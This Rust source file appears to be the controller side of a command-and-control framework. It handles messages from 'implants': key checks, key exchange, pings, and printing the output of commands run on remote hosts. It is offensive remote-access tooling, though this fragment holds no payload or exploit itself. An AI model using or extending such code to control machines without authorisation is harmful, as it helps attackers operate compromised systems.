use std::time::SystemTime;

use super::Implant;

use libvoid::{enums::Protocol, errors::*};

use log::info;

impl Implant {

    pub fn handle(&mut self) ->  ProtocolResult<()> {
        let command = Protocol::try_from(self.readbuf[0])?;
        
        self.readbuf.drain(0..1);

        match command {
            Protocol::Helo => self.handle_helo()?,
            Protocol::SetPhase2Secret => self.initiate(2)?,
            Protocol::KeyExchangeOk => {
                self.is_init = true;
                info!("Implant `{}' is initialised", self.get_fd());
                ()
            },
            Protocol::Ping => self.handle_ping()?,
            Protocol::ReturnCmd => self.handle_return_cmd()?,
            _ => ()
        };

        self.readbuf.clear();
        Ok(())
    }

    fn handle_helo(&mut self) -> ProtocolResult<()> {
        let rkey: u32 = ((self.readbuf[0] as u32) << 24) +
        ((self.readbuf[1] as u32) << 16) +
        ((self.readbuf[2] as u32) << 8) +
        (self.readbuf[3] as u32);
    
        if rkey != *self.crypto.get_helo() {
            return Err(ProtocolError::InvalidKey(rkey));
        }
        self.readbuf.drain(0..4);

        self.initiate(1)?;

        Ok(())
    }

    fn handle_ping(&mut self) -> ProtocolResult<()> {
        self.lastping = SystemTime::now();
        info!("Received ping from implant {}", self.get_fd());
        Ok(())
    }

    fn handle_return_cmd(&mut self) -> ProtocolResult<()> {
        let output = String::from_utf8_lossy(&self.readbuf[..]);

        println!("Output of previous command: \n{}", output);
        Ok(())
    }

}